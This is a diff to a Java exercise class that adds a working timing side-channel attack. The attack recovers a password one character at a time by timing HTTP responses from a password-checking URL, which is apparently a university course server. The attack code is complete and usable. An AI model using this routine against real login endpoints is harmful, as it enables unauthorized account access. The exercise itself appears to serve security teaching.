@@ -14,6 +14,7 @@ public class ex01_M1 {
     public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 30;
     public static int FOUND_THE_PASSWORD = -1;
     public static int ERROR_WHILE_CHECK_TIME = 0;
+    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 30;
 
     /*
      Returns the current value of the most precise available system timer, in nanoseconds.
@@ -91,6 +92,69 @@ public class ex01_M1 {
         return maxAveragePasswordLength;
     }
 
+    public static String checkThePassword(String url, int passwordLength)
+    {
+        long responseTime;
+        char[] availablePasswordChar = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
+                'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
+                'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};
+
+        String charactersFoundFromPassword = "";
+        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++) {
+            Map<Character, Long> passwordToSumTime =  new HashMap<Character, Long>();
+            Map<Character, Integer> passwordAttempts =  new HashMap<Character, Integer>();
+            Map<Character, String> passwordStrings =  new HashMap<Character, String>();
+
+            for (char someChar: availablePasswordChar)
+            {
+                passwordToSumTime.put(someChar, (long) 0);
+                passwordAttempts.put(someChar, 0);
+                String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
+                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "a"));
+                passwordStrings.put(someChar, String.format(url, password));
+            }
+
+            for (int i = 0; i < CHECK_PASSWORD_CHARS_ATTEMPTS; i++)
+            {
+                if (i % (CHECK_PASSWORD_CHARS_ATTEMPTS / 10) == 0)
+                {
+                    System.out.println(String.format("checked %d", i));
+                }
+                for (char someChar: availablePasswordChar)
+                {
+                    responseTime = checkResponseTime(passwordStrings.get(someChar));
+                    if (responseTime != ERROR_WHILE_CHECK_TIME && responseTime != FOUND_THE_PASSWORD)
+                    {
+                        passwordToSumTime.put(someChar, responseTime + passwordToSumTime.get(someChar));
+                        passwordAttempts.put(someChar, passwordAttempts.get(someChar) + 1);
+                    }
+                    else if (responseTime == FOUND_THE_PASSWORD)
+                    {
+                        return passwordStrings.get(someChar);
+                    }
+                }
+            }
+
+            char maxAveragePasswordChar = availablePasswordChar[0];
+            long maxAverage = passwordToSumTime.get(availablePasswordChar[0]) / passwordAttempts.get(availablePasswordChar[0]);
+            for (char someChar: availablePasswordChar)
+            {
+                long currentAverage = passwordToSumTime.get(someChar) / passwordAttempts.get(someChar);
+                System.out.println(String.format("char %c took %d", someChar, currentAverage));
+                if (currentAverage > maxAverage)
+                {
+                    maxAveragePasswordChar = someChar;
+                    maxAverage = currentAverage;
+                }
+            }
+
+            charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, maxAveragePasswordChar);
+            System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
+        }
+
+        return charactersFoundFromPassword;
+    }
+
     public static void main(String[] args) {
         if(args.length != 1) {
             System.out.println("Missing URL argument");
@@ -102,5 +166,8 @@ public class ex01_M1 {
 
         int passwordLength = checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
         System.out.println(String.format("Password length is %d", passwordLength));
+
+        String password = checkThePassword("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1", passwordLength);
+        System.out.println(String.format("The password is %s", password));
     }
 }
